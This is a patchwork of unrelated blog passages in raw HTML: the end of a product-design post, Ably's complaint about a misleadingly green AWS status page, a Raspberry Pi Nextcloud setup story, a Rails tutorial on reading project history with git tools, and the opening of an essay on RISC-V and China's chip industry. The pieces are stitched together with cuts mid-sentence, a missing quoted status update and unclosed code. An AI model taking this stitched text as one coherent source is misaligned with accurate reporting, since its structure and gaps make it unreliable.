to allow click actions into that overview data, but just provide static deep dives, rather than fancy interactive deep dives that lead to more deep dives. In short, the secondary view, which in this case was the analytics deep dives, had to be stripped down a lot.</p><p>2- The client was building a social application. “We need the ability for users to comment, and for other users to respond to these comments via text, voice, and video.” If the initial user doesn’t comment, the corresponding feature of text, voice and video is utterly useless and literally unusable in the UI. So we built the initial comments section, measured the interaction using an analytics tool, or sometimes manually tracked what percentage of users left the initial comment. The idea was that if that percentage is high enough, we would continue with the rest of the product hypothesis, if it’s low, rethink the initial comment.</p><p>In short, design the core, core-core, like the actual core. Then strip it down further, and build it. And measure it, optimize it. And once it reaches a certain level, then you can start to build the rest, otherwise “the rest” will never be used, and won’t be given a fair chance to be measured.</p></div></div></div></div></div></div></div>]]>

<p><strong><em>TL;DR: Don’t trust AWS status reports, they’re misleading</em></strong></p>
<p>This morning at 1:00am the reporting systems for <a href="https://ww.ably.io/platform" rel="noopener">our Ably realtime platform</a> notified us of a whole range of service failures for one of our customers in a dedicated realtime cluster in AWS’ Northern California datacenter (us-west-1).</p>
<p>We investigated and discovered network partitioning along with other severe network failures. We checked the AWS status dashboard for information — nothing, all green. 30 minutes later AWS finally posted a status update with this:</p>

<p>Fortunately that’s pretty simple — what we require is honesty and we expect AWS to err on the side of caution.</p>
<p>Here’s what we did at <a href="https://www.ably.io/" rel="noopener">Ably</a> for our customers to notify them about what happened when we detected the fault:</p>
<ul>
<li>We had monitoring systems to tell us immediately there was a fault, which in turn created an incident automatically in <a href="https://status.ably.io/" rel="noopener">our status site</a> within minutes of the problems in us-west-1.</li>
<li>We then manually <a href="https://status.ably.io/incidents/377" rel="noopener">updated the incident on our status site</a> with our commentary and emailed everyone signed up for status updates with the issue and what we were doing about it (which was to route traffic away from the faulty datacenter).</li>
<li>We took an honest approach and weren’t worried to show a bit of orange on our status site. Because if something is not operating as expected, then we are pretty sure that is not classified as “operating normally” and at best should be classified as “performance issues”. See our status dashboard below:</li>

<h3 id="amazon-aws-you-can-and-should-do-better">Amazon AWS — you can and “should” do better</h3>
<p>Our plea to Amazon AWS is please don’t fall into this post-truth trap and aim to have false green in your status dashboard. Looking at your AWS status dashboard today, in spite of the fact that an entire datacenter was unusable for a few hours this morning, is completely green. See the screenshots: (<a href="https://dl.dropboxusercontent.com/u/1575409/Ably/blog/status-aws-amazon-today-1.png" rel="noopener">page 1</a>), (<a href="https://dl.dropboxusercontent.com/u/1575409/Ably/blog/status-aws-amazon-today-2.png" rel="noopener">page 2</a>) — there is so much green on the status page that we were unable to fit the screenshot in one image (max height of 30,000 pixel). Amazon, your AWS status page today has 38,000 vertical pixels of green!</p>
<p>We rely on AWS infrastructure to deliver our realtime data delivery platform. Amazon needs to take their downtime and issues more seriously, be more upfront about what’s going on, and not wait half an hour to report that a datacenter being offline is “operating normally”. It’s not like they don’t have resources that outstrip any other infrastructure provider, <a href="https://www.google.co.uk/search?%7Bgoogle:acceptedSuggestion%7Doq=amazon+hires+100%2C000+in+a+month&amp;sourceid=chrome&amp;ie=UTF-8&amp;q=amazon+hires+100%2C000+in+a+month&amp;gws_rd=ssl" rel="noopener">they’re hiring 100k employees in the next 18 months</a>.</p>
<p>Amazon AWS, we expect more of you. Please be honest.</p>

    <h3 id="why-am-i-doing-this-to-myself">Why am I doing this to myself?</h3>
<p>I really like taking notes. Notes are an extension of my stupid brain, which can’t remember a <em>damn</em> thing on its own. All these notes were being stored on Google’s servers, which <a href="https://en.wikipedia.org/wiki/PRISM_%28surveillance_program%29" target="_blank" rel="noreferrer noopener">didn’t</a> <a href="https://www.gnu.org/proprietary/malware-google.en.html" target="_blank" rel="noreferrer noopener">seem like</a> <a href="https://www.washingtonpost.com/technology/2019/06/21/google-chrome-has-become-surveillance-software-its-time-switch/" target="_blank" rel="noreferrer noopener">the best</a> <a href="https://www.eff.org/deeplinks/2020/03/google-says-it-doesnt-sell-your-data-heres-how-company-shares-monetizes-and" target="_blank" rel="noreferrer noopener">idea</a>. And it wasn’t just notes. Pictures, videos, miscellaneous files, I was giving it all to Google for free.</p>
<p>Since my notes contain <em>my bad ideas, and they are <strong>my</strong> bad ideas alone</em>, I wanted to take back control of my data. After researching ways to do such a thing (through the Google search engine of course), my best option seemed to be a <a href="https://nextcloud.com/" target="_blank" rel="noreferrer noopener">Nextcloud server</a>.</p>
<p>Nextcloud has all the niceties of a Google Drive or Dropbox, but you host it yourself on your own hardware, and no one’s allowed to snoop. This sounded great! This’ll be so easy! I’ll get this running in just a couple minutes!</p>
<p>Maybe you guessed it from the length of this article, but… this was not the case. Building and setting up this server was a nightmare hellhole, and I’m here today to share my hell with you, the reader, for free!</p>
<p>This isn’t so much a guide or tutorial - more just me explaining (and venting about) the massive effort it took to set this damn thing up. I hope somebody someday learns something from my suffering, or is maybe just entertained.</p>
<h3 id="the-hardware">The hardware</h3>
<p>I had been interested in doing <em>something, anything at all</em>, with a <a href="https://www.raspberrypi.org/" target="_blank" rel="noreferrer noopener">Raspberry Pi</a> for a while, so this was my excuse. Beyond that, I just followed <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-nas" target="_blank" rel="noreferrer noopener">this great article from a Pi magazine</a> for my hardware choices. If you’re wondering what hardware I used, look there. I copied it exactly. Plus, c’mon, look how cute everything looks stacked up like that! A literal “stack”! Ha!</p>
<p><img src="https://acolannino.io/blog/how-i-struggled-to-build-a-nextcloud-server-and-won/nextbox.png" alt="nextbox"></p>
<p>One part the guide doesn’t explain very well was the “USB powered hub” - both why you need one, and what that actually is. Is it a hub powered by USB? A USB powered by a “hub”? What is a “hub”? Maybe it seems obvious to you, and maybe I was just sleep deprived at the time, but I was having trouble wrapping my smooth brain around this concept.</p>
<p>Turns out, the USB hub is simply needed to provide power to the two hard drives, rather than the power going to the Pi <em>and</em> the drives. I have no idea if this was really necessary, but it makes me feel 10% more confident my drives won’t crap out at any moment, and that helps me go to sleep at night.</p>
<h3 id="raid-1-or-whatever-that-means">RAID 1, or whatever that means</h3>
<p>Here I was, all ready to go in fulfilling my long-held dream of running my own little server. Then my stupid coworker comes in, and asks “hey, what if your drive fails? what will you do then?” and ruins all of my fun.</p>
<p>He tells me I should do “RAID”, which is apparently all the rage. RAID stands for “Redundant, Awesome… I dunno”, and was invented on a whim by <a href="https://en.wikipedia.org/wiki/RAID#History" target="_blank" rel="noreferrer noopener">some random nerds in the 80’s</a>. To attempt to give an actual explanation: Using a RAID 1 setup means you get data redundancy, as it will constantly mirror the drives. If one drive craps out, the other drive will still have all the same data, so you just replace the broken one and go about your day as normal. The downside of RAID 1 is you’re getting half the storage capacity that you paid for, but I figured 1 terabyte was large enough to store plenty of memes.</p>
<p>Setting up the RAID array was by far the most pain-free part of the process. Actually, it was the <em>only</em> pain-free part, the rest was pure suffering. I recommend doing this for fun if you’re bored on a Friday evening. It’s cathartic, and the only part of this whole thing that <a href="https://www.youtube.com/watch?v=nVqcxarP9J4" target="_blank" rel="noreferrer noopener">just worked</a>.</p>
<p>All I had to do was run some cute little commands from the guide, and I was golden. I didn’t fully understand the intricacies of everything I was doing, and the command-line interfaces for some of these programs were absolutely wild (press ‘n’ for a new partition, and ‘p’ for a “primary partition”? Really <code>fdisk</code>? Does this make you happy?), but other than that, it was all smooth sailing.</p>
<p>I should note - no one on the internet really cared to explain how a RAID setup should work with Nextcloud. Eventually I figured this out - the RAID array is seen by the OS as one device, so just politely ask Nextcloud to use that instead of the SD card. I ended up having to <a href="https://docs.nextcloud.com/server/latest/admin_manual/issues/general_troubleshooting.html#troubleshooting-data-directory" target="_blank" rel="noreferrer noopener">create a symlink from Nextcloud’s data directory to a directory on my RAID device</a>, but this wasn’t the worst thing I had to suffer through.</p>
<h3 id="big-pixel-energy-destroys-my-wifi">Big Pixel Energy destroys my WiFi</h3>
<p>So here I am, all proud and happy of my brand new Raspberry Pi running a fresh <del>Raspbian</del> Raspberry Pi OS. As I was setting up the RAID array, downloading lots of cute <a href="https://en.wikipedia.org/wiki/Unix_philosophy" target="_blank" rel="noreferrer noopener">UNIX-style utilities</a>, the WiFi starts to cut in-and-out. This has been a problem on my other main machines ever since I switched them to Linux, so I figured it was the <em>mysterious Intel WiFi+bluetooth death bug</em> plaguing me on yet another machine.</p>
<p>I did some more digging, and found what I believe to be the truth (or, as close as <em>I’ll</em> ever get to the truth). There appears to be a <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=247982" target="_blank" rel="noreferrer noopener">widely reported problem with the Pi 4</a> where the signals coming out from the HDMI (which are shaped like squares?) are the same frequency(?) as the WiFi. So, if your display resolution is pumped up high enough, and that HDMI is cranking out lots of square signals, <a href="https://www.raspberrypi.org/forums/viewtopic.php?p=1514642&amp;sid=b811be4b798c7ab50d7626c691b5cc26#p1514642" target="_blank" rel="noreferrer noopener">the WiFi gets totally borked</a>. Neat.</p>
<p>This is clearly absurd, and I hate it. Hardware is bad, and everyone saying “programmers gotta learn hardware too!!!” should get off my lawn. At first I started following the internet’s advice to simply “lower your screen resolution so the WiFi goes fast”, but this became tiring on the eyes (especially with the added problem of <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=250534" target="_blank" rel="noreferrer noopener">not being able to use redshift on the Pi</a>).</p>
<p>Even though I was reluctant to at first, eventually I started controlling my Pi via an SSH terminal from another machine to avoid this problem entirely. Boy oh boy, was this a joyful discovery. Not only was I freed from whatever stupid resolution the WiFi demanded, but I could also use my beloved blue-light filter to prevent my retinas from burning up. Sure, I had no GUI, but learning to do everything through the terminal came easily enough, and once I got there, I felt like some kind of computer wiz-kid.</p>
<h3 id="the-installation">The installation</h3>
<p>After the RAID was set up and I got SSH going, it was time to install Nextcloud. This proved to be shockingly difficult. There can’t just be a little <code>sudo apt install nextcloud</code> action, no no no no no. You need to install each little bit yourself, by hand, and glue every piece together (<code>nextcloud</code> isn’t even in the apt repository, of course you have to download / unpack something called a “tarball” yourself).</p>
<h4 id="attempt-1-snap">Attempt 1: Snap!</h4>
<p><a href="https://snapcraft.io/" target="_blank" rel="noreferrer noopener">Snap</a> is Canonical’s (maker of Ubuntu) locked-down little sandbox for Linux apps. The word “container” is thrown around when describing it, and I have no idea if that’s correct, but I sure as heck wouldn’t recommend the <a href="https://snapcraft.io/nextcloud" target="_blank" rel="noreferrer noopener">official Nextcloud snap</a>.</p>
<p>The major selling point of snap is that it bundles together an application’s dependencies, so it will <em>just work</em> on any Linux distribution. This sounds great! Sign me up! I’m lazy and hate installing my own dependencies! Who the heck wants to do that? Shell scripts, that’s who.</p>
<p>Problem is, this doesn’t <em>really</em> work on every distro, and in fact, it doesn’t work on the latest Raspberry Pi OS. Do I know why? No. The Nextcloud snap <a href="https://en.wikipedia.org/wiki/Fail-silent_system" target="_blank" rel="noreferrer noopener">failed silently</a> before starting up, and it was too shy to tell me why. Cool.</p>
<h4 id="attempt-2-some-shell-scripts-i-found">Attempt 2: Some shell scripts I found</h4>
<p>At this stage, I was still committed to being a lazy jerk. There’s no way in heck I would manually install <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html#prerequisites-for-manual-installation" target="_blank" rel="noreferrer noopener">30-something php modules</a> by hand. So, I found a <a href="https://ownyourbits.com/nextcloudpi/" target="_blank" rel="noreferrer noopener">flashy looking site that claimed to have the scripts for me</a>. It didn’t work. The script took multiple runs to actually complete itself, and after the 5th or so attempt, it seemed happy. I went to the web GUI, told it to “initialize”, and it kinda hung out there for a while. I went to take a walk, and when I came back and it was still pretending to initialize.</p>
<p>I found another <a href="https://github.com/nextcloud/vm" target="_blank" rel="noreferrer noopener">official-sounding shell script</a>, in a last-ditch attempt at being lazy. At least this script had the courage to fail immediately, as it’s <a href="https://github.com/nextcloud/vm/blob/master/nextcloud_install_production.sh/#L83" target="_blank" rel="noreferrer noopener">hardcoded to only work specifically on Ubuntu 20.04</a>. Would have been real nice if it had told me that up-front, but hey, I’m not the one going through the trouble of writing all these (failing) shell scripts.</p>
<h4 id="attempt-3-the-hard-way">Attempt 3: The hard way</h4>
<p>Being lazy clearly wasn’t going so well. By now several days had passed, and all I had to show for myself was a whole terabyte of nothing. Worse yet, the shell scripts I ran had spread their little tentacles all over my pure OS install, so I knew I’d have trouble in the future if I left all that cruft in-place. I decided to re-image my OS, and that I would repeat the RAID setup once I got Nextcloud going.</p>
<p>As previously mentioned, the <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html" target="_blank" rel="noreferrer noopener">recommended installation</a> wants you to install and hook each bit up together yourself. This approach made some sense as I learned (sort of, vaguely) more about how Nextcloud works - It’s running on a webserver directly on your machine, handling all the networking and whatnot, with a full-on SQL database and lots of PHP magic happening too. So, it’s understandable that Nextcloud has to spread it’s mischievous claws in each and every crevice of your OS.</p>
<p>I followed the <a href="https://docs.nextcloud.com/server/latest/admin_manual/index.html" target="_blank" rel="noreferrer noopener">Nextcloud documentation</a>, which sure does exist. In their defense, all of their software is <a href="https://en.wikipedia.org/wiki/Free_and_open-source_software" target="_blank" rel="noreferrer noopener">free and open</a>, including the docs, so I could have submitted any number of changes, and yet here I am selfishly writing this blog. The worst part of this process was the aforementioned php modules, which had to be installed one-by-one, and had mismatched names compared to the Debian repository. I had these all installed after about an hour, and I remember listening to a podcast in the background while suffering through it.</p>
<p>After <code>apt install</code>ing every module (seriously, why doesn’t php have it’s own package manager?!), then gliding through the initialization of Nextcloud with <code>occ</code>, my server was working. The <em>Nextcloud Hub</em> web interface greeted me with the most pleasant design and animations I had seen in quite some time. <strong>It was over. I had won.</strong></p>
<h3 id="conclusion">Conclusion</h3>
<p>All in all, I sure did have a time. The admin page still won’t stop whining about a …</p></div></div>

<h4>To keep track of how a project has been changing through time is key to provide a big picture of what things have been changing and why. After all, the business logic or the domain required those changes to be recorded. Read this to know why it is important to keep an eye on a project’s history.</h4>

<h2>Become a Git Historian</h2>
<p>This is chapter 2 of a series of blog posts about some pieces of advice, tools, and tips you can consider when you arrive at a Rails project considered as Legacy.</p>
<p>In the <a href="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html">previous chapter</a>, we reviewed our project’s anatomy.</p>
<p>In this chapter, we are using <a href="https://git-scm.com/">Git</a> and other tools related to it to find out more about our Rails Legacy System. But this time, it’s our project’s history turn.</p>
<p>First, I want us to understand ‘<strong>history</strong>‘ as:</p>
<blockquote><p>
  “The whole series of past events connected with someone or something”.
</p></blockquote>
<p>When speaking about history in a Rails project, it’s really important to check <em>how</em> our project has changed through time to get an idea of why things have been modified. Some of those adjustments were maybe done based on business logic, or maybe the domain required those changes.</p>
<p>Maybe, other changes happened because someone followed a particular path —which is a normal thing if you consider that every project is different and that there are infinite factors that can affect it in a positive or in a negative way.</p>

<p>In Software Development, a legacy system is outdated computing software that is still in use. That system still meets the needs it was originally designed for but doesn’t allow growth. What a legacy system does now for the project is all it will ever do. A legacy system’s older technology won’t allow it to interact with newer systems.</p>
<h2>Git extras</h2>
<p>To get a general summary of things about the project, like repo age, the number of commits, and who the people involved are we could use <a href="https://github.com/tj/git-extras"><code>git-extras</code></a>.</p>
<pre><code>$ brew install git-extras
</code></pre>
<pre><code>$ git summary

<p>Here is another interesting feature from git-extras, let’s try <code>git effort</code>:</p>
<pre><code>$ git effort --above 15 {src,lib}/*
</code></pre>
<blockquote><p>Displays “effort” statistics. Currently, it shows just the number of commits per file, highlighting the parts with the most activity. The “active days” column is the total number of days when contributed modifications to this file were made.</p></blockquote>

<p><a href="https://github.com/tj/git-extras"><code>git-extras</code></a> has many interesting features that you can explore and use to get a better understanding of your project.</p>
<h3>Git log</h3>
<p>Ok, now let’s understand how <em>change</em> on single objects works with <code>git log</code>.</p>
<pre><code>$ git log --patch --stat Gemfile

<p>As you can see, it will show why a specific update was made. Or, maybe it will just trigger more questions. But, at least you will be closer to your main goal, which is “understand what was the purpose of those changes”.</p>
<h3>Git History</h3>
<p>Also, if you prefer the fancy way and see the timeline of a particular file, you can try <code>git-history</code>.</p>
<p>Now, let’s use <a href="https://github.com/pomber/git-history">git-history</a>, which is like a visual time machine where you can visually review any change on a specific file and understand its timeline.</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg"><img data-attachment-id="5429" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/git_history_-_admin_html_slim" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=2084%2C1350" data-orig-size="2084,1350" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Git_History_-_admin_html_slim" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=300%2C194" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=1024%2C663" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1027%2C665" alt="" width="1027" height="665" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=300%2C194 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=200%2C130 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=768%2C498 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1024%2C663 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1200%2C777 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=860%2C557 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=680%2C440 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=400%2C259 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=50%2C32 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Check this <a href="https://githistory.xyz/webdevtalks/www/blob/master/Gemfile">example</a> out.</p>
<h3>Look for Documentation (we’re using Git as well)</h3>
<p>As we look for documentation keep in mind and ask yourself the following:</p>
<ul>
<li>Is there any documentation at all?</li>
<li>Is there good commentary on the code?</li>
<li>Do the names of things make sense?</li>
<li>Are the System Use Cases documented?</li>
<li>Is there someone in the team that understands the system?</li>
</ul>
<p>We can use <code>git whatchange doc</code> to see logs and differences in our documentation, check the example above:</p>
<pre><code>$ git whatchanged doc
commit e43e0fecfb5914ec0e72eadff73e90c0e14c7026
Author: Daniel Contreras &lt;daniel.country.club@magmalabs.io&gt;
Date:   Thu Jan 28 19:32:35 2016 -0500

    Render diagram inline. Use AsciiDoc for the table of contents.

:100644 100644 13fa6c9d4 ff7935d08 R055 doc/client-system/README.md     doc/client-system/README.adoc
</code></pre>
<p>It seems that we have a doc folder. 🎉🎉🎉 It also seems like the last time a document was modified was in 2016, so it’s time to start documenting your new progress. That would help you in the future, and any other developer that joins the team.</p>
<h3>Extra: The README</h3>
<p>There is a README?  Well, yes. But it is so poor…</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg"><img data-attachment-id="5432" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/readme_template" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=2032%2C490" data-orig-size="2032,490" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="README_Template" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=300%2C72" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=1024%2C247" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1424%2C343" alt="" width="1424" height="343" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=300%2C72 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=200%2C48 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=768%2C185 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1024%2C247 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1200%2C289 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=860%2C207 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=680%2C164 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=400%2C96 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=50%2C12 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Hey, but don’t worry, there are many templates you can use; like this <a href="https://github.com/dbader/readme-template" rel="noopener" target="_blank">example</a>.</p>
<h2>Wrap up</h2>
<p>Here are more things to keep in mind:</p>
<ul>
<li>Document everything you learn.</li>
<li>Keep documentation close to the code, simple is better.</li>
<li>You must understand the design/architecture.</li>
<li>Once you understand something, refine its documentation.</li>
</ul>
<p>I hope you find this blogpost compelling. In the following chapter, we are going to cover some nice toolings for static analysis of your code.</p>

                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that 